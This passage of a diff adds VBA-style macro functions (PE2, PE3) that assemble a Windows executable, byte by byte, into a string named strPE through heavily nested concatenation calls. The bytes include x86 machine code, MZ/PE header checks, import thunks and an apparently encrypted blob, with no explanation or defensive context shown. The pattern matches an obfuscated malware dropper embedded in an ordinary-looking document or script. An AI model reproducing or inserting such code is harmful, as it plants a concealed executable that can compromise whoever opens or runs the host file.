+    strPE = A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 21), "Xa@"), 0), 131), 236), 4), 235), 215), 232), 153), 253), 255), 255), 233), "q"), 255), 255), 255), 144), 144), 144), 144), 3), "@<"), 129), "8PE"), 0), 0), "t"), 5), "1"), 192), 195), "f"), 144), "f"), 129), "x"), 24), 11), 1), 15), 148), 192), 15)
+    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(strPE, 182), 192), 195), 141), "v"), 0), 139), "D$"), 4), "f"), 129), "8MZt"), 5), "1"), 192), 195), "f"), 144), 235), 206), 141), 180), "&"), 0), 0), 0), 0), 141), 180), "&"), 0), 0), 0), 0), "VS"), 139), "T$"), 12), 139), "\$"), 16), 3), "R")
+    strPE = A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(strPE, "<"), 15), 183), "r"), 6), 15), 183), "B"), 20), 133), 246), 141), "D"), 2), 24), "t"), 27), "1"), 201), 144), 139), "P"), 12), "9"), 218), "w"), 7), 3), "P"), 8), "9"), 218), "w"), 12), 131), 193), 1), 131), 192), "(9"), 241), "u"), 232), "1"), 192), "[^"), 195), 141)
+    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "v"), 0), "UWVS"), 131), 236), 28), 139), "|$0"), 137), "<$"), 232), 25), 3), 0), 0), 131), 248), 8), "whf"), 129), "="), 0), 0), "@"), 0), "MZu]"), 184), 0), 0), "@"), 0), 232), "S"), 255), 255), 255), 133), 192), "t")
+    strPE = A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(strPE, "O"), 161), "<"), 0), "@"), 0), 15), 183), 144), 20), 0), "@"), 0), 5), 0), 0), "@"), 0), 15), 183), "h"), 6), 141), "\"), 16), 24), 133), 237), "t21"), 246), 235), 10), 131), 198), 1), 131), 195), "(9"), 238), "t$"), 199), "D$"), 8), 8), 0)
+    strPE = A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 137), "|$"), 4), 137), 28), "$"), 232), 180), 2), 0), 0), 133), 192), "u"), 222), 131), 196), 28), 137), 216), "[^_]"), 195), "f"), 144), 131), 196), 28), "1"), 219), 137), 216), "[^_]"), 195), 141), "t&"), 0), "f"), 129), "="), 0)
+    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 0), "@"), 0), "MZuWVS"), 184), 0), 0), "@"), 0), 232), 217), 254), 255), 255), 133), 192), "tB"), 161), "<"), 0), "@"), 0), 139), "\$"), 12), 141), 144), 0), 0), "@"), 0), 15), 183), 128), 20), 0), "@"), 0), 129), 235), 0), 0), "@")
+    strPE = B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(strPE, 0), 15), 183), "r"), 6), 141), "D"), 2), 24), 133), 246), "t"), 26), "1"), 201), 139), "P"), 12), "9"), 211), "r"), 7), 3), "P"), 8), "9"), 211), "r"), 12), 131), 193), 1), 131), 192), "(9"), 241), "u"), 232), "1"), 192), "[^"), 195), "1"), 192), 195), 141), 180), "&")
+    strPE = A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 141), "t&"), 0), "1"), 210), "f"), 129), "="), 0), 0), "@"), 0), "MZt"), 3), 137), 208), 195), 184), 0), 0), "@"), 0), 232), "f"), 254), 255), 255), 133), 192), "t"), 239), 161), "<"), 0), "@"), 0), 15), 183), 144), 6), 0), "@"), 0)
+    strPE = A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(strPE, 137), 208), 195), 141), "v"), 0), "f"), 129), "="), 0), 0), "@"), 0), "MZS"), 139), "L$"), 8), "uG"), 184), 0), 0), "@"), 0), 232), "6"), 254), 255), 255), 133), 192), "t9"), 161), "<"), 0), "@"), 0), 141), 144), 0), 0), "@"), 0), 15), 183), 128)
+    strPE = B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 20), 0), "@"), 0), 15), 183), "Z"), 6), 141), "D"), 2), 24), 133), 219), "t"), 27), "1"), 210), "f"), 144), 246), "@' t"), 7), 133), 201), "t"), 15), 131), 233), 1), 131), 194), 1), 131), 192), "(9"), 218), "u"), 233), "1"), 192), "["), 195), 141), "t&")
+    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 0), 144), "f"), 129), "="), 0), 0), "@"), 0), "MZu"), 26), 184), 0), 0), "@"), 0), 232), 219), 253), 255), 255), 186), 0), 0), 0), 0), 133), 192), 184), 0), 0), "@"), 0), 15), "D"), 194), 195), "1"), 192), 195), 141), 180), "&"), 0), 0), 0), 0), 144)
+    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(strPE, "1"), 192), "f"), 129), "="), 0), 0), "@"), 0), "MZt"), 3), 243), 195), 144), "VS"), 184), 0), 0), "@"), 0), 232), 164), 253), 255), 255), 133), 192), "tJ"), 161), "<"), 0), "@"), 0), 139), "\$"), 12), 141), 144), 0), 0), "@"), 0), 15), 183), 128)
+    strPE = B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 20), 0), "@"), 0), 129), 235), 0), 0), "@"), 0), 15), 183), "r"), 6), 141), "D"), 2), 24), 133), 246), "t 1"), 201), 141), 182), 0), 0), 0), 0), 139), "P"), 12), "9"), 211), "r"), 7), 3), "P"), 8), "9"), 211), "r"), 18), 131), 193), 1), 131), 192), "(")
+    strPE = B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "9"), 241), "u"), 232), "1"), 192), "[^"), 195), 141), "v"), 0), 139), "@$[^"), 247), 208), 193), 232), 31), 195), 141), "t&"), 0), 144), "f"), 129), "="), 0), 0), "@"), 0), "MZWVS"), 139), "\$"), 16), "uV"), 184), 0), 0), "@")
+    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 0), 232), "$"), 253), 255), 255), 133), 192), "tH"), 161), "<"), 0), "@"), 0), 139), 144), 128), 0), "@"), 0), 5), 0), 0), "@"), 0), 133), 210), "t4"), 15), 183), "x"), 6), 15), 183), "H"), 20), 133), 255), 141), "L"), 8), 24), "t$1"), 246), 141), 180)
+    strPE = A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "&"), 0), 0), 0), 0), 141), "v"), 0), 139), "A"), 12), "9"), 194), "r"), 7), 3), "A"), 8), "9"), 194), "r"), 18), 131), 198), 1), 131), 193), "(9"), 254), "u"), 232), "[1"), 192), "^_"), 195), "f"), 144), 137), 208), 5), 0), 0), "@"), 0), "u"), 13), 235)
+    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 237), 141), "t&"), 0), 144), 131), 235), 1), 131), 192), 20), 139), "H"), 4), 133), 201), "u"), 7), 139), "P"), 12), 133), 210), "t"), 212), 133), 219), 127), 232), 139), "@"), 12), "[^"), 5), 0), 0), "@"), 0), "_"), 195), 144), 144), 144), 144), 144), 144), 144), 144)
+    strPE = B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 144), 144), 144), 144), "QP="), 0), 16), 0), 0), 141), "L$"), 12), "r"), 21), 129), 233), 0), 16), 0), 0), 131), 9), 0), "-"), 0), 16), 0), 0), "="), 0), 16), 0), 0), "w"), 235), ")"), 193), 131), 9), 0), "XY"), 195), 144), 144), 255), "%")
+    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 236), "a@"), 0), 144), 144), 255), "%"), 232), "a@"), 0), 144), 144), 255), "%"), 228), "a@"), 0), 144), 144), 255), "%"), 224), "a@"), 0), 144), 144), 255), "%"), 220), "a@"), 0), 144), 144), 255), "%"), 216), "a@"), 0), 144), 144), 255), "%"), 212), "a")
+    strPE = A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "@"), 0), 144), 144), 255), "%"), 208), "a@"), 0), 144), 144), 255), "%"), 204), "a@"), 0), 144), 144), 255), "%"), 200), "a@"), 0), 144), 144), 255), "%"), 196), "a@"), 0), 144), 144), 255), "%"), 192), "a@"), 0), 144), 144), 255), "%"), 188), "a@"), 0)
+    strPE = A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(strPE, 144), 144), 255), "%"), 184), "a@"), 0), 144), 144), 255), "%"), 176), "a@"), 0), 144), 144), 255), "%"), 172), "a@"), 0), 144), 144), 255), "%"), 168), "a@"), 0), 144), 144), 255), "%"), 164), "a@"), 0), 144), 144), 255), "%"), 160), "a@"), 0), 144), 144)
+    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 255), "%"), 156), "a@"), 0), 144), 144), 255), "%"), 152), "a@"), 0), 144), 144), 255), "%"), 140), "a@"), 0), 144), 144), "f"), 144), "f"), 144), 139), "D$"), 4), 193), 224), 5), 3), 5), 180), "a@"), 0), 195), 144), 144), 161), 212), "S@"), 0), 195)
+
+    PE2 = strPE
+End Function
+
+Private Function PE3() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 141), 180), "&"), 0), 0), 0), 0), 141), "v"), 0), 139), "D$"), 4), 135), 5), 212), "S@"), 0), 195), 144), 144), 144), 144), 144), 141), "L$"), 4), 131), 228), 240), 255), "q"), 252), "U"), 137), 229), "Q"), 131), 236), 20), 232), 10), 240), 255), 255), 199), 4)
+    strPE = B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "$"), 0), 0), 0), 0), 232), 171), 238), 255), 255), 199), 4), "$"), 16), "'"), 0), 0), 255), 21), "la@"), 0), "P"), 235), 240), 144), 144), "S"), 131), 236), 24), 199), 4), "$"), 2), 0), 0), 0), 141), "\$$"), 232), 136), 255), 255), 255), 199), "D")
+    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "$"), 8), 27), 0), 0), 0), 137), "D$"), 12), 199), "D$"), 4), 1), 0), 0), 0), 199), 4), "$"), 152), "A@"), 0), 232), 236), 254), 255), 255), 199), 4), "$"), 2), 0), 0), 0), 232), "\"), 255), 255), 255), 139), "T$ "), 137), "\$"), 8)
+    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 137), 4), "$"), 137), "T$"), 4), 232), 148), 254), 255), 255), 232), 239), 254), 255), 255), 144), 144), 144), 233), "{"), 235), 255), 255), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 255), 255), 255), 255), "`)@"), 0), 0), 0), 0), 0), 255), 255)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 255), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 10), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "0"), 30), 0), 0), "H"), 3), 0), 0), 199), 190), 227), "eaaaa;Vje"), 199), 190), 131), 236), 34), 143), "1"), 1), "L"), 236), 211), 238), 149), 178), "h7"), 211), "5")
+    strPE = B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 145), "M"), 200), 9), 169), "C"), 246), "A"), 210), 165), "k"), 130), 130), 25), 197), 146), 195), 164), 8), 179), 226), 162), "%N"), 177), "2L"), 236), 243), 238), 133), 130), 226), 181), "L"), 254), 155), 224), 7), 202), 169), "d"), 23), 238), "h-"), 223), "5"), 187), "E")
+    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 198), "m"), 0), "Y"), 142), "5"), 215), 238), 198), "h"), 210), 154), 246), "~O"), 164), 8), 179), 226), 162), 255), "^"), 150), 145), 196), 195), 27), "^"), 186), 154), 150), 135), 159), "5"), 187), "A"), 198), "m"), 133), 238), 203), 245), "h="), 219), 191), "0"), 238), 195), "5")
+    strPE = B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 226), 181), "N"), 250), 199), "A"), 156), 229), 130), "<"), 157), 239), 28), 133), 159), 225), 185), 238), 213), "Ue8"), 175), 208), 134), 17), 199), 214), 148), 12), 169), 215), 183), 13), 139), 201), 197), "b8k"), 11), "e"), 199), 190), 227), "T8"), 233), 180), "2")
+    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 144), 233), 139), "_"), 145), 199), "D"), 154), 18), "WGe"), 199), 190), 184), "T"), 14), 239), 178), 15), 196), 239), 178), 13), "|"), 191), 227), "e"), 148), 238), 139), "2N!%"), 154), 18), 238), 10), 233), 199), 190), 227), ">"), 246), "l"), 177), 13), 199), 140)
+    strPE = A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "#"), 225), 149), 236), 177), "6"), 149), 238), 139), 142), 146), 144), 216), 154), 18), "7%"), 230), 4), 238), 139), 229), 244), 190), 227), 236), "'"), 212), 231), "5"), 173), 161), 181), 13), 178), 248), "}"), 227), "8k"), 188), "T8"), 233), 180), 15), "8"), 237), 181), 13)
+    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 234), 184), 251), 30), "8kf"), 165), 200), ":)d"), 199), 190), 210), 154), "BH"), 151), "aNG"), 8), "l"), 175), 20), "&"), 135), 154), "A6"), 236), 6), 214), 166), "D"), 153), 143), 28), 176), 246), "A"), 180), 15), 192), 239), 181), "5"), 175), 9)
+    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(strPE, 180), 133), 204), "A6"), 218), 199), 145), 227), "e"), 254), "y"), 150), "b"), 159), 238), 10), 30), "8A"), 28), "T8Wrd"), 199), 190), 10), 172), 198), 190), 227), 141), 168), "A"), 28), 154), 232), 200), 208), "J"), 183), 204), 140), 19), 174), 218), 134), 23)
+    strPE = A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 234), 219), 141), 23), 168), 210), 143), 8), 162), 208), 151), "K"), 173), 205), 227), 186), 128), 187), "P"), 165), 179), "SJ"), 168), 2), "c"), 155), "o"), 154), 22), 127), "+"), 150), " "), 196), 217), 204), 149), 213), 182), "U"), 17), "Q"), 130), "W"), 178), 252), "P`"), 24)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(strPE, "1"), 165), "f"), 160), "O"), 223), "A"), 19), 237), "&6"), 1), "/j"), 156), 150), "Ue"), 134), 221), 128), 0), 183), 202), 217), "E"), 179), 219), 155), 17), 232), 214), 151), 8), 171), 146), 130), 21), 183), 210), 138), 6), 166), 202), 138), 10), 169), 145), 155), 13)
+    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 179), 211), 143), "N"), 191), 211), 143), "I"), 166), 206), 147), 9), 174), 221), 130), 17), 174), 209), 141), "J"), 191), 211), 143), "^"), 182), 131), 211), "K"), 254), 146), 201), "J"), 237), 133), 146), "X"), 247), 144), 219), "h"), 205), 255), 128), 6), 162), 206), 151), "H"), 139), 223)
+    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 141), 2), 178), 223), 132), 0), 253), 158), 134), 11), 234), 235), 176), "I"), 162), 208), 216), 20), 250), 142), 205), "P"), 202), 180), 162), 6), 164), 219), 147), 17), 234), 251), 141), 6), 168), 218), 138), 11), 160), 132), 195), 2), 189), 215), 147), "I"), 231), 218), 134), 3)
+    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 171), 223), 151), 0), 202), 180), 182), 22), 162), 204), 206), "$"), 160), 219), 141), 17), 253), 158), 174), 10), 189), 215), 143), 9), 166), 145), 214), "K"), 247), 158), 203), "2"), 174), 208), 135), 10), 176), 205), 195), "+"), 147), 158), 213), "K"), 244), 133), 195), "1"), 181), 215)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 135), 0), 169), 202), 204), "R"), 233), 142), 216), "E"), 181), 200), 217), "T"), 246), 144), 211), "L"), 231), 210), 138), 14), 162), 158), 164), 0), 164), 213), 140), "h"), 205), 246), 140), 22), 179), 132), 195), 1), 162), 200), 140), 21), 180), 209), 150), 23), 164), 219), 205), 4)
+    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 189), 203), 145), 0), 162), 218), 132), 0), 233), 208), 134), 17), 202), 180), 227), 168), 136), ".f"), 186), 249), 23), 130), ">"), 231), 156), 169), 15), 196), 155), 2), "m"), 213), 31), 209), 19), 149), "="), 223), 208), "5"), 8), "D\"), 190), "P7$"), 1), 137)
+    strPE = A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 147), 186), 207), 232), 209), 254), 11), 184), 236), 216), 190), 179), "@-"), 207), "S"), 173), "uzu"), 222), "e"), 175), "NV"), 199), 145), "A6"), 15), 135), 214), 227), "u"), 199), 190), 139), "e"), 199), 254), 227), "2"), 175), 230), "G6"), 34), "A6"), 246)
+    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "~"), 17), 236), "e"), 199), 191), ":4"), 148), "7"), 4), "2"), 175), 190), 195), "e"), 199), 237), 181), 13), 213), "(j"), 135), "8kf"), 165), 179), "xhb"), 198), "}f"), 165), 178), "["), 187), 166), "/7"), 30), 154), "8"), 223), 137), 4), 191), 144)
+    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 142), 12), 164), 204), 140), 22), 168), 216), 151), "K"), 164), 209), 142), "e"), 140), 225), 229), "u                                ")
+    strPE = B(strPE, "                                                  ")
+    strPE = B(strPE, "                                                  ")
+    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "                                    "), 128), ")@"), 0), 255), 255), 255), 255), 255), 255), 255), 255), 255), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 2), 0), 0), 0), 255), 255), 255), 255), 160), "(@"), 0), 176), "(@"), 0), 192), "(@"), 0), "N"), 230), "@"), 187), 177), 25), 191), "D"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
+    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "%c%c%c%c%c%c%c%c%cpipe-%d-\mojo.27")
+    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(strPE, "16.17532.12236541455731762054"), 0), " S@"), 0), "@P@"), 0), 192), 26), "@"), 0), 0), 128), "@"), 0), 4), 128), "@"), 0)
+    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 144), "S@"), 0), " p@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), "Unknown error"), 0), 0), 0), "_matherr(): %s in ")
+    strPE = B(A(A(A(B(strPE, "%s(%g, %g)  (retval=%g)"), 10), 0), 0), "Argument domain error (D")
